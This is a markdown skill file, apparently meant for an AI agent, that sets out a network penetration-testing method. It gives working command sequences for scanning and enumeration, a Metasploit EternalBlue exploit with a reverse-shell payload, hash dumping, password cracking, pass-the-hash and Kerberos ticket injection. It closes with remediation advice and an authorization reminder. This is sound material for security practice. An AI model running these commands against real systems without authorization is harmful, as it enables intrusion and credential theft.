---
name: network-penetration-testing
description: Professional skills and methodology for network penetration testing
version: 1.0.0
---

# Network Penetration Testing

## Overview

Network penetration testing is an important part of assessing the security of network infrastructure. This skill provides the methods, tools, and best practices for network penetration testing.

## Testing Scope

### 1. Information Gathering

**Checklist items:**
- Network topology
- Host discovery
- Port scanning
- Service identification

### 2. Vulnerability Scanning

**Checklist items:**
- System vulnerabilities
- Service vulnerabilities
- Misconfigurations
- Weak passwords

### 3. Exploitation

**Checklist items:**
- Remote code execution
- Privilege escalation
- Lateral movement
- Persistence

## Information Gathering

### Network Scanning

**Using Nmap:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -p- 192.168.1.100

# Service identification
nmap -sV -sC 192.168.1.100

# Operating system identification
nmap -O 192.168.1.100

# Full scan
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Using Masscan:**
```bash
# Fast port scanning
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service Enumeration

**SMB enumeration:**
```bash
# Enumerate SMB shares
smbclient -L //192.168.1.100 -N

# Enumerate SMB users
enum4linux -U 192.168.1.100

# Using nmap scripts
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC enumeration:**
```bash
# Enumerate RPC services
rpcclient -U "" -N 192.168.1.100

# Using nmap scripts
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumeration:**
```bash
# SNMP scan
snmpwalk -v2c -c public 192.168.1.100

# Using onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability Scanning

### Using Nessus

```bash
# Launch Nessus
# Access the web interface
# Create a scan task
# Analyze the scan results
```

### Using OpenVAS

```bash
# Launch OpenVAS
gvm-setup

# Access the web interface
# Create a scan task
# Analyze the scan results
```

### Using Nmap Scripts

```bash
# Vulnerability scanning
nmap --script vuln 192.168.1.100

# Specific vulnerability scanning
nmap --script smb-vuln-ms17-010 192.168.1.100

# All scripts
nmap --script all 192.168.1.100
```

## Exploitation

### Metasploit

**Basic usage:**
```bash
# Launch Metasploit
msfconsole

# Search for an exploit
search ms17-010

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Set parameters
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Execute
exploit
```

**Post-exploitation:**
```bash
# Get system information
sysinfo

# Escalate privileges
getsystem

# Migrate process
migrate <pid>

# Dump hashes
hashdump

# Retrieve passwords
run post/windows/gather/smart_hashdump
```

### Common Exploits

**EternalBlue:**
```bash
# Using Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# Using a standalone tool
python eternalblue.py 192.168.1.100
```

**BlueKeep:**
```bash
# Using Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost:**
```bash
# Using a standalone tool
python smbghost.py 192.168.1.100
```

## Lateral Movement

### Password Cracking

**Using Hashcat:**
```bash
# Crack NTLM hashes
hashcat -m 1000 hashes.txt wordlist.txt

# Crack LM hashes
hashcat -m 3000 hashes.txt wordlist.txt

# Using rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Using John:**
```bash
# Crack hashes
john hashes.txt

# Using a wordlist
john --wordlist=wordlist.txt hashes.txt

# Using rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Using Impacket:**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Pass-the-Ticket

**Using Mimikatz:**
```bash
# Extract tickets
sekurlsa::tickets /export

# Inject a ticket
kerberos::ptt ticket.kirbi
```

**Using Rubeus:**
```bash
# Request a ticket
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# Inject a ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Tool Usage

### Nmap

```bash
# Full scan
nmap -sS -sV -sC -O -p- -T4 target

# Stealth scan
nmap -sS -T2 -f -D RND:10 target

# UDP scan
nmap -sU -p- target
```

### Metasploit

```bash
# Launch the framework
msfconsole

# Initialize the database
msfdb init

# Import scan results
db_import nmap.xml

# View hosts
hosts

# View services
services
```

### Burp Suite

**Network scanning:**
1. Configure the proxy
2. Browse the target network
3. Analyze traffic
4. Active scanning

## Testing Checklist

### Information Gathering
- [ ] Network topology discovery
- [ ] Host discovery
- [ ] Port scanning
- [ ] Service identification
- [ ] Operating system identification

### Vulnerability Scanning
- [ ] System vulnerability scanning
- [ ] Service vulnerability scanning
- [ ] Misconfiguration check
- [ ] Weak password check

### Exploitation
- [ ] Remote code execution
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Common Security Issues

### 1. Unpatched Systems

**Problem:**
- Systems not updated in a timely manner
- Known vulnerabilities present
- Poor patch management

**Remediation:**
- Install patches promptly
- Establish a patch management process
- Perform regular security updates

### 2. Weak Passwords

**Problem:**
- Default passwords
- Simple passwords
- Password reuse

**Remediation:**
- Enforce a strong password policy
- Enable multi-factor authentication
- Change passwords regularly

### 3. Open Ports

**Problem:**
- Unnecessary open ports
- Exposed services
- Misconfigured firewall

**Remediation:**
- Close unnecessary ports
- Implement firewall rules
- Use VPN access

### 4. Misconfiguration

**Problem:**
- Default configuration
- Excessive privileges
- Improper service configuration

**Remediation:**
- Secure configuration baseline
- Principle of least privilege
- Regular configuration reviews

## Best Practices

### 1. Information Gathering

- Comprehensive scanning
- Multi-tool verification
- Document findings
- Analyze results

### 2. Exploitation

- Authorized testing
- Minimal impact
- Record actions
- Clean up promptly

### 3. Report Writing

- Detailed documentation
- Risk rating
- Remediation recommendations
- Verification steps

## Notes

- Only perform testing in authorized environments
- Avoid impacting production systems
- Comply with laws and regulations
- Protect test data
